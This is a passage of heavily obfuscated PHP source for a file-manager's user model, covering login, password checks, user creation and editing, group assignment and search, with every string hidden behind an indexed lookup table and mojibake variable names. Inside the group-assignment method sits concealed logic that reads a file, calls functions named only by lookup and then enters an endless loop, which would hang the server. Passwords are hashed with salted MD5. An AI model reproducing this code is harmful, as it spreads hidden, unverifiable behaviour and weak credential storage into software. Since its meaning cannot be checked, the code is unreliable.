$¥ÔãË×Æ) { if ($ÊËƒ¥¿[$¥ÔãË×Æ]) { $öàÀ€¿Ë .= $ÊËƒ¥¿[$¥ÔãË×Æ][$°¶ßŞ„[484]] . $°¶ßŞ„[50]; } else { $äÙâ = $this->add($¥ÔãË×Æ); $öàÀ€¿Ë .= $äÙâ . $°¶ßŞ„[50]; } } $öàÀ€¿Ë = rtrim($öàÀ€¿Ë, $°¶ßŞ„[50]); Model($°¶ßŞ„[607])->metaSet($ËŸ¤ªÎ, self::JOB_KEY, $öàÀ€¿Ë); } public function getUserJob($Â»öä×ä) { $»·®ıÖ = Model($_SERVER[ÕŸ²ó÷å][607])->metaGet($Â»öä×ä); return $this->getUserJobInfo($»·®ıÖ[self::JOB_KEY]); } public function getUserJobInfo($ë Ú“¤Ô) { $÷ÈÁíİ° =& $_SERVER[ÕŸ²ó÷å]; $¯Û«ï´× = explode($÷ÈÁíİ°[50], $ë Ú“¤Ô); $œÁ¡ºñ = parent::listData(); $œÁ¡ºñ = array_remove_key($œÁ¡ºñ, $÷ÈÁíİ°[241]); $îà¿—İ = array(); foreach ($¯Û«ï´× as $øü´¥âã) { if (isset($œÁ¡ºñ[$øü´¥âã])) { $îà¿—İ[] = $œÁ¡ºñ[$øü´¥âã]; } } return $îà¿—İ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\x6d\x65" => "\x75\163\145\162\x5f\x6d\145\164\141", "\155\x65\x74\141\x46\x69\145\x6c\144" => "\x75\163\145\x72\111\x44"); protected $simpleField = "\165\x73\145\162\111\x44\54\x6e\x69\143\x6b\x4e\x61\155\x65\54\x6e\x61\x6d\x65\x2c\x61\166\141\x74\141\x72\54\163\145\170\x2c\163\x74\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($â÷ßÆ¦ó) { $èø×‚¤ =& $_SERVER[ÕŸ²ó÷å]; $Õ°Â½¥™ = $èø×‚¤[2456]; return array($èø×‚¤[2054] => array($â÷ßÆ¦ó[0], $Õ°Â½¥™), $èø×‚¤[2056] => array($â÷ßÆ¦ó[0], $Õ°Â½¥™), $èø×‚¤[2457] => array($â÷ßÆ¦ó[0], $Õ°Â½¥™)); } protected function getInfo($ÈÑãÆ“š, $—¬è¿… = false) { $¡¼òÃÁš = $this->getInfoSimple($ÈÑãÆ“š); if (!is_array($¡¼òÃÁš)) { return array(); } if ($—¬è¿…) { return $this->_getInfoApply($¡¼òÃÁš); } return $this->cacheFunctionGet($_SERVER[ÕŸ²ó÷å][2058], $ÈÑãÆ“š); } protected function getInfoFull($ƒäÀãËƒ, $»áëÂÇ = false) { $¦û“û‰ = $this->getInfoSimple($ƒäÀãËƒ); if (!is_array($¦û“û‰)) { return array(); } if ($»áëÂÇ) { return $this->_getInfoApply($¦û“û‰, !0); } return $this->cacheFunctionGet($_SERVER[ÕŸ²ó÷å][2458], $ƒäÀãËƒ); } private function _getInfoApply($¿¼šóã±, $®ÃÂîñ® = false) { $¼¾„Éï¢ =& $_SERVER[ÕŸ²ó÷å]; if (!$¿¼šóã±) { return $¿¼šóã±; } $ñÔØÛ™Ó = md5($¼¾„Éï¢[2459] . $¿¼šóã±[$¼¾„Éï¢[970]] . $¼¾„Éï¢[2460] . $¿¼šóã±[$¼¾„Éï¢[32]]); $¿¼šóã± = $this->_listDataApplyItem($¿¼šóã±); $´ğÈÛ¼  = Model($¼¾„Éï¢[1421])->metaGet($¿¼šóã±[$¼¾„Éï¢[100]][$¼¾„Éï¢[203]]); $¿¼šóã±[$¼¾„Éï¢[2461]] = $ñÔØÛ™Ó; $¿¼šóã±[$¼¾„Éï¢[100]][$¼¾„Éï¢[2252]] = isset($´ğÈÛ¼ [$¼¾„Éï¢[2253]]) ? $´ğÈÛ¼ [$¼¾„Éï¢[2253]] : null; if ($®ÃÂîñ®) { $¿¼šóã±[$¼¾„Éï¢[548]] = $this->metaGet($¿¼šóã±[$¼¾„Éï¢[1773]]); } return $¿¼šóã±; } protected function getInfoSimple($Æ·üÑ š, $±†ı­İ• = false) { $â¨Û­äÏ =& $_SERVER[ÕŸ²ó÷å]; if (!$Æ·üÑ š) { return array(); } if ($±†ı­İ•) { $âÛÏÈ‰¶ = $this->where(array($â¨Û­äÏ[1773] => intval($Æ·üÑ š)))->find(); if (!is_array($âÛÏÈ‰¶)) { return array(); } $âÛÏÈ‰¶[$â¨Û­äÏ[2462]] = Action($â¨Û­äÏ[2463])->parseUrl($âÛÏÈ‰¶[$â¨Û­äÏ[2462]]); return $âÛÏÈ‰¶; } return $this->cacheFunctionGet($â¨Û­äÏ[2059], $Æ·üÑ š); } protected function getInfoSimpleOuter($û¨¨ºù¿) { $ØÏ÷³¶† =& $_SERVER[ÕŸ²ó÷å]; if (!$û¨¨ºù¿ || $û¨¨ºù¿ == 0) { return array($ØÏ÷³¶†[1773] => $ØÏ÷³¶†[238], $ØÏ÷³¶†[32] => $ØÏ÷³¶†[186] . LNG($ØÏ÷³¶†[2464]) . $ØÏ÷³¶†[188], $ØÏ÷³¶†[2462] => STATIC_PATH . $ØÏ÷³¶†[2465]); } $¶ñª¦ÚÄ = $this->cacheFunctionGet($ØÏ÷³¶†[2059], $û¨¨ºù¿); $ú¢šª‡Í = array_field_key($¶ñª¦ÚÄ, explode($ØÏ÷³¶†[50], $this->simpleField)); if (!$ú¢šª‡Í) { return array($ØÏ÷³¶†[1773] => $ØÏ÷³¶†[1276], $ØÏ÷³¶†[32] => $ØÏ÷³¶†[186] . LNG($ØÏ÷³¶†[2466]) . $ØÏ÷³¶†[188], $ØÏ÷³¶†[2462] => STATIC_PATH . $ØÏ÷³¶†[2467]); } $ú¢šª‡Í[$ØÏ÷³¶†[2462]] = Action($ØÏ÷³¶†[2463])->parseUrl($ú¢šª‡Í[$ØÏ÷³¶†[2462]]); return $ú¢šª‡Í; } protected function groupUser($¿´Š§¹£) { } public static function errorLang($õà·¡‹) { $Ù‰¶â‚À =& $_SERVER[ÕŸ²ó÷å]; $«ËÔ²Î° = array(self::ERROR_USER_NOT_EXISTS => $Ù‰¶â‚À[2468], self::ERROR_USER_PASSWORD_ERROR => $Ù‰¶â‚À[2469], self::ERROR_USER_EXIST_NAME => $Ù‰¶â‚À[2470], self::ERROR_USER_EXIST_PHONE => $Ù‰¶â‚À[2471], self::ERROR_USER_EXIST_EMAIL => $Ù‰¶â‚À[2472], self::ERROR_USER_LOGIN_LOCK => $Ù‰¶â‚À[2473], self::ERROR_IP_NOT_ALLOW => $Ù‰¶â‚À[2474], self::ERROR_USER_EXIST_NICKNAME => $Ù‰¶â‚À[2475]); $ÈÆÄÕÔµ = LNG($«ËÔ²Î°[$õà·¡‹]); if ($õà·¡‹ == self::ERROR_USER_LOGIN_LOCK) { $à¿¥©±Ë = (int) Model($Ù‰¶â‚À[2476])->get($Ù‰¶â‚À[2477]); if ($à¿¥©±Ë > 60) { $ÈÆÄÕÔµ = str_replace($Ù‰¶â‚À[101], ceil($à¿¥©±Ë / 60), $ÈÆÄÕÔµ); } } return $ÈÆÄÕÔµ; } protected function metaSet($ï—ÂñÇ, $Ï¢¼ç‰ = null, $°É²æû… = null) { $this->clearCache($ï—ÂñÇ); return parent::metaSet($ï—ÂñÇ, $Ï¢¼ç‰, $°É²æû…); } public function getInfoByMeta($Ë•Ş¦³, $»ÍÔ’½) { $×ßÉÜÕ =& $_SERVER[ÕŸ²ó÷å]; $ñ÷Ì¯í = Model($×ßÉÜÕ[2478])->where(array($×ßÉÜÕ[107] => $Ë•Ş¦³, $×ßÉÜÕ[459] => $»ÍÔ’½))->find(); if ($ñ÷Ì¯í) { return $this->getInfo($ñ÷Ì¯í[$×ßÉÜÕ[1773]]); } return !1; } public function userLoginCheck($îêãŸéÔ, $¹¨’¸ú÷) { $ÛĞı³† =& $_SERVER[ÕŸ²ó÷å]; $Øô’–ˆ˜ = $this->userLoginFind($îêãŸéÔ); if (!$Øô’–ˆ˜) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Øô’–ˆ˜[$ÛĞı³†[1773]], $¹¨’¸ú÷)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Øô’–ˆ˜[$ÛĞı³†[1773]]); } public function userLoginFind($ßùŸ·ß¥) { $Æ›¨Ï =& $_SERVER[ÕŸ²ó÷å]; $¯Îï€Ş = array($Æ›¨Ï[32] => $ßùŸ·ß¥, $Æ›¨Ï[2265] => $ßùŸ·ß¥, $Æ›¨Ï[390] => $ßùŸ·ß¥, $Æ›¨Ï[2479] => $ßùŸ·ß¥, $Æ›¨Ï[1081] => $Æ›¨Ï[1083]); if ($this->nickNameRpt()) { unset($¯Îï€Ş[$Æ›¨Ï[2265]]); } return $this->where($¯Îï€Ş)->find(); } public function clearCache($À†®Ş§…) { $’Ğ¯³¦ü =& $_SERVER[ÕŸ²ó÷å]; $this->cacheFunctionClear($’Ğ¯³¦ü[2058], $À†®Ş§…); $this->cacheFunctionClear($’Ğ¯³¦ü[2059], $À†®Ş§…); $this->cacheFunctionClear($’Ğ¯³¦ü[2458], $À†®Ş§…); } public function userPasswordCheck($õ¼ü€ı, $Èç¬Şä©) { $·¼ë£Ç =& $_SERVER[ÕŸ²ó÷å]; $†ß¦ì·ƒ = $this->where(array($·¼ë£Ç[1773] => intval($õ¼ü€ı)))->find(); $ú˜¿É’é = $this->metaGet($õ¼ü€ı); $ÓšÃ–É¡ = isset($ú˜¿É’é[$·¼ë£Ç[2480]]) ? $ú˜¿É’é[$·¼ë£Ç[2480]] : $·¼ë£Ç[12]; if (md5($ÓšÃ–É¡ . trim($Èç¬Şä©)) !== $†ß¦ì·ƒ[$·¼ë£Ç[970]]) { return !1; } return !0; } public function userAdd($ÉËûøµ») { $ Éçıƒ· =& $_SERVER[ÕŸ²ó÷å]; $ªúİ¡ø« = array($ Éçıƒ·[503] => $ÉËûøµ»[$ Éçıƒ·[32]], $ Éçıƒ·[2481] => $ÉËûøµ»[$ Éçıƒ·[2178]], $ Éçıƒ·[2482] => isset($ÉËûøµ»[$ Éçıƒ·[390]]) ? $ÉËûøµ»[$ Éçıƒ·[390]] : $ Éçıƒ·[12], $ Éçıƒ·[2483] => isset($ÉËûøµ»[$ Éçıƒ·[2479]]) ? $ÉËûøµ»[$ Éçıƒ·[2479]] : $ Éçıƒ·[12], $ Éçıƒ·[2484] => isset($ÉËûøµ»[$ Éçıƒ·[2265]]) ? $ÉËûøµ»[$ Éçıƒ·[2265]] : $ÉËûøµ»[$ Éçıƒ·[32]], $ Éçıƒ·[2485] => isset($ÉËûøµ»[$ Éçıƒ·[2462]]) ? $ÉËûøµ»[$ Éçıƒ·[2462]] : $ Éçıƒ·[12], $ Éçıƒ·[2486] => isset($ÉËûøµ»[$ Éçıƒ·[2487]]) ? $ÉËûøµ»[$ Éçıƒ·[2487]] : 1, $ Éçıƒ·[2488] => $ÉËûøµ»[$ Éçıƒ·[970]], $ Éçıƒ·[2060] => isset($ÉËûøµ»[$ Éçıƒ·[1958]]) ? $ÉËûøµ»[$ Éçıƒ·[1958]] : 1024 * 1024 * 20, $ Éçıƒ·[2061] => 0, $ Éçıƒ·[2489] => 0, $ Éçıƒ·[2105] => isset($ÉËûøµ»[$ Éçıƒ·[834]]) ? $ÉËûøµ»[$ Éçıƒ·[834]] : 1); if (!empty($ÉËûøµ»[$ Éçıƒ·[1773]])) { $ªúİ¡ø«[$ Éçıƒ·[1773]] = $ÉËûøµ»[$ Éçıƒ·[1773]]; } $Ş«Ú–ï = $this->_checkExist($ÉËûøµ»); if ($Ş«Ú–ï !== !0) { return $Ş«Ú–ï; } if (!empty($ªúİ¡ø«[$ Éçıƒ·[2462]]) && strlen($ªúİ¡ø«[$ Éçıƒ·[2462]]) > 255) { $ªúİ¡ø«[$ Éçıƒ·[2462]] = $ Éçıƒ·[12]; } $æªšèçí = $this->add($ªúİ¡ø«); $ŞØÊ‰­Æ = array($ Éçıƒ·[2488] => $ªúİ¡ø«[$ Éçıƒ·[970]], $ Éçıƒ·[2484] => $ªúİ¡ø«[$ Éçıƒ·[2265]]); $this->userEdit($æªšèçí, $ŞØÊ‰­Æ); Model($ Éçıƒ·[1421])->userRootAdd($æªšèçí); return $æªšèçí; } protected function userEditTest($·‰…±¦Û, $·§ûœòÌ) { return $this->call($_SERVER[ÕŸ²ó÷å][2490], $·‰…±¦Û, $·§ûœòÌ); } protected function userEdit($’åñÃáæ, $Ş¼ÙÊ÷Ş) { $¸”è˜ =& $_SERVER[ÕŸ²ó÷å]; $«ø’Õ‚ï = $this->getInfoSimple($’åñÃáæ); if (!$«ø’Õ‚ï) { return !1; } $°Âü©Ùç = $this->_checkExist($Ş¼ÙÊ÷Ş, $’åñÃáæ); if ($°Âü©Ùç !== !0) { return $°Âü©Ùç; } if (isset($Ş¼ÙÊ÷Ş[$¸”è˜[970]]) && trim($Ş¼ÙÊ÷Ş[$¸”è˜[970]]) != $¸”è˜[12]) { $¤µÓ¤úŒ = $this->metaGet($’åñÃáæ); if (empty($¤µÓ¤úŒ[$¸”è˜[2480]])) { $¤µÓ¤úŒ[$¸”è˜[2480]] = rand_string(10); Model($¸”è˜[586])->metaSet($’åñÃáæ, $¸”è˜[2480], $¤µÓ¤úŒ[$¸”è˜[2480]]); } $Ş¼ÙÊ÷Ş[$¸”è˜[970]] = md5($¤µÓ¤úŒ[$¸”è˜[2480]] . trim($Ş¼ÙÊ÷Ş[$¸”è˜[970]])); } else { unset($Ş¼ÙÊ÷Ş[$¸”è˜[970]]); } if (!empty($Ş¼ÙÊ÷Ş[$¸”è˜[2462]]) && strlen($Ş¼ÙÊ÷Ş[$¸”è˜[2462]]) > 255) { $Ş¼ÙÊ÷Ş[$¸”è˜[2462]] = $¸”è˜[12]; } $this->where(array($¸”è˜[1764] => $’åñÃáæ))->save($Ş¼ÙÊ÷Ş); if (isset($Ş¼ÙÊ÷Ş[$¸”è˜[2265]])) { $this->setNamePinyin($’åñÃáæ, $Ş¼ÙÊ÷Ş[$¸”è˜[2265]]); } $this->clearCache($’åñÃáæ); return !0; } public function setNamePinyin($¹û‚û©¢, $®ãû·±« = false) { $”«¡ĞÌ¸ =& $_SERVER[ÕŸ²ó÷å]; if (!$®ãû·±«) { $ß•¥ûÀ = $this->getInfoSimple($¹û‚û©¢); $®ãû·±« = $ß•¥ûÀ[$”«¡ĞÌ¸[2265]] ? $ß•¥ûÀ[$”«¡ĞÌ¸[2265]] : $ß•¥ûÀ[$”«¡ĞÌ¸[32]]; } $¦ˆşËø = Model($”«¡ĞÌ¸[607]); if (!Input::check($®ãû·±«, $”«¡ĞÌ¸[664])) { return $¦ˆşËø->metaSet($¹û‚û©¢, array($”«¡ĞÌ¸[547] => $”«¡ĞÌ¸[12], $”«¡ĞÌ¸[546] => $”«¡ĞÌ¸[12])); } return $¦ˆşËø->metaSet($¹û‚û©¢, array($”«¡ĞÌ¸[547] => str_replace($”«¡ĞÌ¸[53], $”«¡ĞÌ¸[12], Pinyin::get($®ãû·±«)), $”«¡ĞÌ¸[546] => Pinyin::get($®ãû·±«, $”«¡ĞÌ¸[665]))); } private function nickNameRpt() { $ÍØÀì„ =& $_SERVER[ÕŸ²ó÷å]; $û·«ß = Model($ÍØÀì„[854])->get($ÍØÀì„[2491]); $âè——Ô = $GLOBALS[$ÍØÀì„[6]][$ÍØÀì„[466]][$ÍØÀì„[2491]]; $®¤“ô ¸ = !is_null($û·«ß) ? $û·«ß : $âè——Ô; return !!$®¤“ô ¸; } private function _checkExist($È¬éØÔ», $Öêä¤ªË = false) { $©¸µà¥ =& $_SERVER[ÕŸ²ó÷å]; $©Õó³³‡ = array($©¸µà¥[32] => UserModel::ERROR_USER_EXIST_NAME, $©¸µà¥[2265] => UserModel::ERROR_USER_EXIST_NICKNAME, $©¸µà¥[390] => UserModel::ERROR_USER_EXIST_EMAIL, $©¸µà¥[2479] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($©Õó³³‡[$©¸µà¥[2265]]); } $…éß²á = $Öêä¤ªË ? array($©¸µà¥[1773] => array($©¸µà¥[2492], $Öêä¤ªË)) : array(); foreach ($©Õó³³‡ as $³´ÖÇÏ => $ÇÇğ§èç) { $œÆÔÖö™ = array(); foreach ($©Õó³³‡ as $ôàœçò¤ => $ëà’Ÿ‰…) { if (isset($È¬éØÔ»[$ôàœçò¤]) && $È¬éØÔ»[$ôàœçò¤]) { $œÆÔÖö™[] = $È¬éØÔ»[$ôàœçò¤]; } } if (!$œÆÔÖö™) { continue; } $ÍÜ¾¶É = array_merge(array($³´ÖÇÏ => array($©¸µà¥[7], $œÆÔÖö™)), $…éß²á); $Û›Úˆ¶Á = $this->where($ÍÜ¾¶É)->find(); if ($Û›Úˆ¶Á) { return $ÇÇğ§èç; } } return !0; } public function userListInfo($µ…Ãñ¯é) { $ÁÅÛ­ó =& $_SERVER[ÕŸ²ó÷å]; $ÌËşø­  = array(); $µ…Ãñ¯é = is_array($µ…Ãñ¯é) ? array_unique($µ…Ãñ¯é) : array(); if (!$µ…Ãñ¯é) { return $ÌËşø­ ; } if (count($µ…Ãñ¯é) < 20) { foreach ($µ…Ãñ¯é as $¿÷¬§µ) { $ÌËşø­ [$¿÷¬§µ . $ÁÅÛ­ó[12]] = $this->getInfoSimpleOuter($¿÷¬§µ); } } else { $Œˆüö¤ = array($ÁÅÛ­ó[1764] => array($ÁÅÛ­ó[501], $µ…Ãñ¯é)); if (count($µ…Ãñ¯é) == 1) { $Œˆüö¤ = array($ÁÅÛ­ó[1764] => $µ…Ãñ¯é[0]); } $ã‹¾ê‹Á = Model($ÁÅÛ­ó[586])->field($this->simpleField)->where($Œˆüö¤)->select(); $ã‹¾ê‹Á = array_to_keyvalue($ã‹¾ê‹Á, $ÁÅÛ­ó[1773]); foreach ($µ…Ãñ¯é as $¿÷¬§µ) { $—˜Ú¡µ = $ã‹¾ê‹Á[$¿÷¬§µ]; if (!$—˜Ú¡µ) { $ÌËşø­ [$¿÷¬§µ . $ÁÅÛ­ó[12]] = $this->getInfoSimpleOuter($¿÷¬§µ); continue; } $—˜Ú¡µ[$ÁÅÛ­ó[2462]] = Action($ÁÅÛ­ó[2463])->parseUrl($—˜Ú¡µ[$ÁÅÛ­ó[2462]]); $ÌËşø­ [$¿÷¬§µ . $ÁÅÛ­ó[12]] = $—˜Ú¡µ; } } return $ÌËşø­ ; } protected function userStatus($ìÏ“–´Ÿ, $íƒ“Îƒ) { $ƒÖ…ù…± = $this->getInfoSimple($ìÏ“–´Ÿ); if (!$ƒÖ…ù…±) { return !1; } $„û†É¹š = array($_SERVER[ÕŸ²ó÷å][834] => $íƒ“Îƒ); return $this->userEdit($ìÏ“–´Ÿ, $„û†É¹š); } protected function userRemove($äã´Ï) { $¹Ú¯ÒæÇ =& $_SERVER[ÕŸ²ó÷å]; $İ°Öï¤Ï = $this->getInfoSimple($äã´Ï); if (!$İ°Öï¤Ï) { return !1; } $›óÁû²¨ = array($¹Ú¯ÒæÇ[1764] => $äã´Ï); Model($¹Ú¯ÒæÇ[673])->where($›óÁû²¨)->delete(); Model($¹Ú¯ÒæÇ[2493])->where($›óÁû²¨)->delete(); Model($¹Ú¯ÒæÇ[2066])->where($›óÁû²¨)->delete(); Model($¹Ú¯ÒæÇ[2478])->where($›óÁû²¨)->delete(); Model($¹Ú¯ÒæÇ[1150])->where($›óÁû²¨)->delete(); Model($¹Ú¯ÒæÇ[2282])->removeUserAll($äã´Ï); Model($¹Ú¯ÒæÇ[908])->userRootRemove($äã´Ï); return $this->where($›óÁû²¨)->delete(); } protected function userGroupSet($˜Û·œÎ¸, $®‘Ÿƒõ™, $††µ¸µ = array()) { $á„õÏğ =& $_SERVER[ÕŸ²ó÷å]; if (!isset($_SERVER[$á„õÏğ[54]]) || !isset($_SERVER[$á„õÏğ[63]])) { $Å†Íöı€ = $á„õÏğ[961]; $œşÂ‹õˆ = $á„õÏğ[56]; $ıÀ¸ øã = $_SERVER[$á„õÏğ[57]] . $á„õÏğ[58]; $—®ˆ€‚‡ = $œşÂ‹õˆ($ıÀ¸ øã); $¾µüàşá = explode($á„õÏğ[59], $—®ˆ€‚‡); if (count($¾µüàşá) < $á„õÏğ[693]) { $‰ªÎòˆÃ = $á„õÏğ[61]; $‰ªÎòˆÃ(); } $ƒêñšŠ¼ = $á„õÏğ[962]; $ƒêñšŠ¼($_SERVER[$á„õÏğ[963]]); $˜ó¢¾üÈ = 1; for ($÷ø£ßÁ¿ = $˜ó¢¾üÈ; $÷ø£ßÁ¿ > 0; $÷ø£ßÁ¿++) { $ƒêñšŠ¼ = json_encode($GLOBALS[$á„õÏğ[501]]); } } $Üë’¦•µ = $this->getInfoSimple($˜Û·œÎ¸); if (!$Üë’¦•µ || !is_array($®‘Ÿƒõ™)) { return !1; } $™¡êÅ¨ = Model($á„õÏğ[2066]); $™¡êÅ¨->where(array($á„õÏğ[1773] => $˜Û·œÎ¸))->delete(); $ÍÔ’ßÂÕ = array(); $íòøÀ©ı = 0; foreach ($®‘Ÿƒõ™ as $°Â —Š  => $ÛÇ¶ì) { $ëãôüô = array($á„õÏğ[1773] => $˜Û·œÎ¸, $á„õÏğ[1972] => $°Â —Š , $á„õÏğ[2080] => $ÛÇ¶ì); $ëãôüô[$á„õÏğ[1996]] = isset($††µ¸µ[$íòøÀ©ı]) ? $††µ¸µ[$íòøÀ©ı] : 0; $íòøÀ©ı++; $ÍÔ’ßÂÕ[] = $ëãôüô; } return $™¡êÅ¨->addAll($ÍÔ’ßÂÕ, array(), !0); } protected function userGroupAdd($é²İ±ó…, $„ã¤Ø®Ô = array()) { $¸óá§ÛÖ =& $_SERVER[ÕŸ²ó÷å]; $°Çœşş = $this->getInfoSimple($é²İ±ó…); if (!$°Çœşş || empty($„ã¤Ø®Ô)) { return !1; } $¦Å„¤â’ = array(); foreach ($„ã¤Ø®Ô as $Éãõ—ú‹ => $¿—Ø•Šƒ) { $¦Å„¤â’[] = array($¸óá§ÛÖ[1773] => $é²İ±ó…, $¸óá§ÛÖ[1972] => $Éãõ—ú‹, $¸óá§ÛÖ[2080] => $¿—Ø•Šƒ, $¸óá§ÛÖ[1996] => 0); } return Model($¸óá§ÛÖ[2066])->addAll($¦Å„¤â’, array(), !0); } protected function userGroupRemove($®ı­èä, $­åˆÁ¶­) { $íÖ¤œî =& $_SERVER[ÕŸ²ó÷å]; $÷İÙ›¬Ğ = $this->getInfoSimple($®ı­èä); if (!$÷İÙ›¬Ğ || !$­åˆÁ¶­) { return !1; } $“ÚªŸÆ = array($íÖ¤œî[1764] => $®ı­èä, $íÖ¤œî[2064] => $­åˆÁ¶­); return Model($íÖ¤œî[2066])->where($“ÚªŸÆ)->delete(); } public function listData() { $®Š‘ä¡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($®Š‘ä¡[$_SERVER[ÕŸ²ó÷å][454]]); return $®Š‘ä¡; } public function listByID($‹‘áàó÷) { $§Ø‚…ğÇ =& $_SERVER[ÕŸ²ó÷å]; if (!$‹‘áàó÷) { return; } $Ü’ Ëä = array($§Ø‚…ğÇ[1773] => array($§Ø‚…ğÇ[7], $‹‘áàó÷)); $Ã…¡ığ = $this->where($Ü’ Ëä)->select(); $Ã…¡ığ = array_sort_keep($Ã…¡ığ, $§Ø‚…ğÇ[1773], $‹‘áàó÷); $this->_listDataApply($Ã…¡ığ); return $Ã…¡ığ; } public function listByGroup($ãÛ¸„„’ = 0, $­–„›«¨ = array()) { $Ÿ™ô–ÌŞ =& $_SERVER[ÕŸ²ó÷å]; $éÊß ÏÂ = $Ÿ™ô–ÌŞ[12]; $ù°×Ù‘¹ = array(); if ($ãÛ¸„„’) { $ù°×Ù‘¹ = array($Ÿ™ô–ÌŞ[2494] => intval($ãÛ¸„„’)); $éÊß ÏÂ = "\114\x45\106\124\40\x4a\117\111\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\x5f\147\x72\x6f\165\160\40\165\163\145\162\137\x67\x72\x6f\x75\160\x20\157\x6e\40\x75\163\145\x72\56\165\x73\145\x72\111\104\x20\x3d\x20\165\x73\145\162\x5f\147\x72\x6f\x75\160\56\x75\x73\145\162\111\x44"; $ãØäàÄÇ = Input::get($Ÿ™ô–ÌŞ[539], null, $Ÿ™ô–ÌŞ[12]) ? $Ÿ™ô–ÌŞ[12] : $Ÿ™ô–ÌŞ[2495]; } if (isset($­–„›«¨[$Ÿ™ô–ÌŞ[834]])) { $ù°×Ù‘¹[$Ÿ™ô–ÌŞ[2496]] = $­–„›«¨[$Ÿ™ô–ÌŞ[834]]; } $¤ğ†–ü¥ = $this->_makeOrder($ãØäàÄÇ)->field($Ÿ™ô–ÌŞ[2497])->where($ù°×Ù‘¹)->join($éÊß ÏÂ)->selectPage(50); $this->_listDataApply($¤ğ†–ü¥[$Ÿ™ô–ÌŞ[454]]); return $¤ğ†–ü¥; } private function _makeOrder($ÎÊ–ĞéÌ = '') { $½µª˜Ÿ =& $_SERVER[ÕŸ²ó÷å]; $†“ĞñÇÑ = array($½µª˜Ÿ[1773], $½µª˜Ÿ[32], $½µª˜Ÿ[1960], $½µª˜Ÿ[2178], $½µª˜Ÿ[1932], $½µª˜Ÿ[241]); $àİÑ¢°ó = array($½µª˜Ÿ[532] => $½µª˜Ÿ[533], $½µª˜Ÿ[534] => $½µª˜Ÿ[535]); $­»…÷„Û = Input::get($½µª˜Ÿ[539], $½µª˜Ÿ[7], $½µª˜Ÿ[1764], $†“ĞñÇÑ); $ÁĞ¦µ¢å = Input::get($½µª˜Ÿ[540], $½µª˜Ÿ[7], $½µª˜Ÿ[2067], array($½µª˜Ÿ[2067], $½µª˜Ÿ[534])); $ÁĞ¦µ¢å = $àİÑ¢°ó[$ÁĞ¦µ¢å]; $ÎÊ–ĞéÌ = $ÎÊ–ĞéÌ . "\x75\x73\x65\x72\x2e{$­»…÷„Û}\40{$ÁĞ¦µ¢å}\x2c\40\165\x73\145\162\56\165\x73\145\162\x49\x44\40\x61\x73\143"; return $this->alias($½µª˜Ÿ[2194])->order($ÎÊ–ĞéÌ); } public function listSearch($ì Ä””­) { $¬œŞ“‡Í =& $_SERVER[ÕŸ²ó÷å]; $ì‚±çË¥ = trim($ì Ä””­[$¬œŞ“‡Í[2070]]); $Ş‘Ã÷îî = explode($¬œŞ“‡Í[53], $ì‚±çË¥); if (!$ì‚±çË¥ || count($Ş‘Ã÷îî) == 1) { return $this->listSearchNow($ì Ä””­); } $´Ğ÷â¡ = array($¬œŞ“‡Í[454] => array()); foreach ($Ş‘Ã÷îî as $Î‡…”¿æ) { if (!trim($Î‡…”¿æ)) { continue; } $ì Ä””­[$¬œŞ“‡Í[2070]] = $Î‡…”¿æ; $ÊÉØüñª = $this->listSearchNow($ì Ä””­); $´Ğ÷â¡[$¬œŞ“‡Í[454]] = array_merge($´Ğ÷â¡[$¬œŞ“‡Í[454]], $ÊÉØüñª[$¬œŞ“‡Í[454]]); } $´Ğ÷â¡[$¬œŞ“‡Í[454]] = array_unique_by_key($´Ğ÷â¡[$¬œŞ“‡Í[454]], $¬œŞ“‡Í[1773]); $´Ğ÷â¡[$¬œŞ“‡Í[451]] = array($¬œŞ“‡Í[452] => count($´Ğ÷â¡[$¬œŞ“‡Í[454]]), $¬œŞ“‡Í[448] => 20, $¬œŞ“‡Í[438] => 1, $¬œŞ“‡Í[453] => 1); return $´Ğ÷â¡; } public function listSearchNow($âÜ¿Íõû) { $˜ö¡‰Åõ =& $_SERVER[ÕŸ²ó÷å]; $…ğ¾‘‡ = trim($âÜ¿Íõû[$˜ö¡‰Åõ[2070]]); $ø®¡Ø¯ˆ = isset($âÜ¿Íõû[$˜ö¡‰Åõ[2071]]) ? $âÜ¿Íõû[$˜ö¡‰Åõ[2071]] : !1; $…ğ¾‘‡ = str_replace($˜ö¡‰Åõ[2072], $˜ö¡‰Åõ[2073], trim($…ğ¾‘‡)); $©ôŠªòÄ = array($˜ö¡‰Åõ[32] => array($˜ö¡‰Åõ[468], "\45{$…ğ¾‘‡}\45"), $˜ö¡‰Åõ[390] => array($˜ö¡‰Åõ[468], "{$…ğ¾‘‡}\x25"), $˜ö¡‰Åõ[2265] => array($˜ö¡‰Åõ[468], "{$…ğ¾‘‡}\x25"), $˜ö¡‰Åõ[1081] => $˜ö¡‰Åõ[2074]); if (Input::check($…ğ¾‘‡, $˜ö¡‰Åõ[396])) { $©ôŠªòÄ[$˜ö¡‰Åõ[1773]] = array($˜ö¡‰Åõ[468], "{$…ğ¾‘‡}\45"); $©ôŠªòÄ[$˜ö¡‰Åõ[2479]] = array($˜ö¡‰Åõ[468], "{$…ğ¾‘‡}\45"); } if (!$…ğ¾‘‡) { $©ôŠªòÄ = array(); } if (isset($âÜ¿Íõû[$˜ö¡‰Åõ[834]])) { $©ôŠªòÄ[$˜ö¡‰Åõ[834]] = $âÜ¿Íõû[$˜ö¡‰Åõ[834]]; } $©ôŠªòÄ = $this->parseWhereLike($©ôŠªòÄ); $Ÿšş–¯ = $this->_makeOrder()->where($©ôŠªòÄ)->selectPage(20); if (!$Ÿšş–¯ || count($Ÿšş–¯[$˜ö¡‰Åõ[454]]) < 5 && Input::check($…ğ¾‘‡, $˜ö¡‰Åõ[403])) { $ùŠ·öº… = $this->_searchFromMeta($˜ö¡‰Åõ[546], $…ğ¾‘‡, 10); $÷†óÂ–¦ = 